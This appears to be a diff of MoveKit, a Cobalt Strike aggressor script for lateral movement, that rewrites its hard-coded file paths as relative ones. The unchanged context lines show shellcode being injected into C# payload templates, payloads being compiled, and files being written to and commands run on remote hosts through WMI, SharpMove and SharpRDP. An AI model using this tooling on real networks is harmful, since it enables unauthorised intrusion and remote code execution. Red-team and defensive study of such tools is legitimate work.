@@ -3,6 +3,8 @@
 # MoveKit
 # by: @0xthirteen
 #
+# Paths modified from original version for use with cobalt_strike_extension_kit
+#
 # Currently compiling will work on Linux (may support Win/Mac in the future)
 #
 # Dependencies:
@@ -11,10 +13,10 @@
 #
 
 
-include(script_resource("/opt/cobalt_strike_extension_kit/scripts/moveDialogs.cna"));
-include(script_resource("/opt/cobalt_strike_extension_kit/scripts/moveCommands.cna"));
-include(script_resource("/opt/cobalt_strike_extension_kit/scripts/payloadGen.cna"));
-include(script_resource("/opt/cobalt_strike_extension_kit/scripts/helpMenus.cna"));
+include(script_resource("scripts/moveDialogs.cna"));
+include(script_resource("scripts/moveCommands.cna"));
+include(script_resource("scripts/payloadGen.cna"));
+include(script_resource("scripts/helpMenus.cna"));
 global('%moveKit::movedefaults')
 
 menubar("Move", "movement", 2);
@@ -184,12 +186,12 @@ sub moveKit::buildassembly{
 		exit();
 	}
 	#location of .CS source file
-	$handle2 = openf(script_resource("/opt/cobalt_strike_extension_kit/exe/FileWrite.cs"));
+	$handle2 = openf(script_resource("exe/FileWrite.cs"));
 	$swmidata = readb($handle2, -1);
 	closef($handle2);
 	$fp = strrep($swmidata, 'LOADLOADLOAD', $basesixty);
-	$savelocation = script_resource("/opt/cobalt_strike_extension_kit/exe/dynamic-build.cs");
-	$bltasm = script_resource("/opt/cobalt_strike_extension_kit/exe/dfw.exe");
+	$savelocation = script_resource("exe/dynamic-build.cs");
+	$bltasm = script_resource("exe/dfw.exe");
 	$handle3 = openf(">$savelocation");
 	writeb($handle3, $fp);
 	closef($handle3);
@@ -223,17 +225,17 @@ sub moveKit::compilepl{
 	}
 
 	if($desc ismatch '^InstallUtil.*'){
-		$saveas = script_resource("/opt/cobalt_strike_extension_kit/exe/InstallUtil.exe");
+		$saveas = script_resource("Templates/InstallUtil.exe");
 		$refs = "/reference:System.Configuration.Install";
 	}
 	else if($desc ismatch '^NonPreBuiltCustom.*'){
-		$saveas = script_resource("/opt/cobalt_strike_extension_kit/exe/CustomNonPre.exe");
+		$saveas = script_resource("Templates/CustomNonPre.exe");
 		if($templ ismatch '^service-.*'){
 			$refs = "/reference:System.ServiceProcess"
 		}
 	}
 	else if($desc ismatch '^Shellcode-.*'){
-		$saveas = script_resource("/opt/cobalt_strike_extension_kit/exe/ExcelDCOM.exe");
+		$saveas = script_resource("ExcelDCOM.exe");
 	}
 	if($archi eq "x86"){
 		$platf = "-platform:x86";
@@ -241,7 +243,7 @@ sub moveKit::compilepl{
 	else if($archi eq "x64"){
 		$platf = "-platform:x64";
 	}
-	$prebuild = script_resource("/opt/cobalt_strike_extension_kit/exe/TempPreCompileFile.cs");
+	$prebuild = script_resource("Templates/TempPreCompileFile.cs");
 	$handle4 = openf(">$prebuild");
 	writeb($handle4, $sourcepay);
 	closef($handle4);
@@ -271,10 +273,10 @@ sub moveKit::customhandler{
 	$sharptask = $2;
 	$descname = $3;
 	$fwargs = $4;
-	$sharpasm = "/exe/SharpMove.exe";
+	$sharpasm = "exe/SharpMove.exe";
 
 	if($1['cmdtrigger'] eq "RDP"){
-		$sharpasm = "/exe/SharpRDP.exe";
+		$sharpasm = "exe/SharpRDP.exe";
 	}
 
 	if($1['auto'] eq "true"){
@@ -302,7 +304,7 @@ sub moveKit::shellconly{
 	$task = $2;
 	$desc = $3;
 	$pltype = "raw";
-	$sharpasm = "/exe/ExcelDCOM.exe";
+	$sharpasm = "ExcelDCOM.exe";
 
 	if($ops['x86'] eq "false"){
 		$plarch = "x64";
@@ -335,7 +337,7 @@ sub moveKit::shellconly{
 			}
 		}
 	}
-	$outpl = openf(script_resource("/opt/cobalt_strike_extension_kit/exe/ExcelDCOM.cs"));
+	$outpl = openf(script_resource("ExcelDCOM.cs"));
 	$data = readb($outpl, -1);
 	closef($outpl);
 	$noncompiled = strrep($data, %movedefaults["findstring"], $finshellc);
@@ -429,7 +431,7 @@ sub moveKit::writeonlyhandler{
 	($drive, $path) = split(':', $gen['droplocation']);
 	if($gen['writetype'] ismatch "^WMI.*"){
 		btask($bid, "" . dstamp(ticks()) . " - Writing $filename to $dlocation on $target via WMI");
-		bexecute_assembly($bid, script_resource("/opt/cobalt_strike_extension_kit/exe/dfw.exe"), $writeargs);
+		bexecute_assembly($bid, script_resource("exe/dfw.exe"), $writeargs);
 		bpause($bid, 8000);
 		return;
 	}
@@ -788,7 +790,7 @@ sub moveKit::makeplandhost{
 			}
 		}
 	}
-	$outpl = openf(script_resource("/opt/cobalt_strike_extension_kit/exe/$template"));
+	$outpl = openf(script_resource("Templates/$template"));
 	$data = readb($outpl, -1);
 	closef($outpl);
 	$finalpayload = strrep($data, %movedefaults["findstring"], $finshellc);
@@ -855,7 +857,7 @@ sub moveKit::payloadbuilder{
 			}
 		}
 	}
-	$outpl = openf(script_resource("/opt/cobalt_strike_extension_kit/exe/$template"));
+	$outpl = openf(script_resource("Templates/$template"));
 	$data = readb($outpl, -1);
 	closef($outpl);
 	$noncompiled = strrep($data, %moveKit::movedefaults["findstring"], $finshellc);
@@ -948,7 +950,7 @@ sub moveKit::filewrite{
 
 	if($writetype eq "WMI"){
 		btask($bid, "" . dstamp(ticks()) . " - Writing $filename to $dlocation on $target via WMI");
-		bexecute_assembly!($bid, script_resource("/opt/cobalt_strike_extension_kit/exe/dfw.exe"), $fwargs);
+		bexecute_assembly!($bid, script_resource("exe/dfw.exe"), $fwargs);
 		bpause($bid, 8000);
 		return;
 	}
@@ -975,11 +977,11 @@ sub moveKit::bearings{
 	$compile = $4;
 	$descname = $5;
 	$exectemplate = $6;
-	$fwbin = "/exe/dfw.exe";
-	$sharpasm = "/exe/SharpMove.exe";
+	$fwbin = "exe/dfw.exe";
+	$sharpasm = "exe/SharpMove.exe";
 
 	if($1['cmdtrigger'] eq "RDP"){
-		$sharpasm = "/exe/SharpRDP.exe";
+		$sharpasm = "exe/SharpRDP.exe";
 	}
 
 	if($1['droplocation'] ismatch '.*\\\$'){
@@ -1070,13 +1072,13 @@ sub moveKit::prechecks{
 		exit();
 	}
 	if($cmdtrig eq "RDP"){
-		if(!-exists "Assemblies/SharpRDP.exe"){
+		if(!-exists "exe/SharpRDP.exe"){
 			show_error("The SharpRDP assembly is required for this command trigger type");
 			exit();
 		}
 	}
 	else{
-		if(!-exists script_resource("/opt/cobalt_strike_extension_kit/exe/SharpMove.exe")){
+		if(!-exists script_resource("exe/SharpMove.exe")){
 			show_error("The SharpMove assembly is required for this command trigger type");
 			exit();
 		}
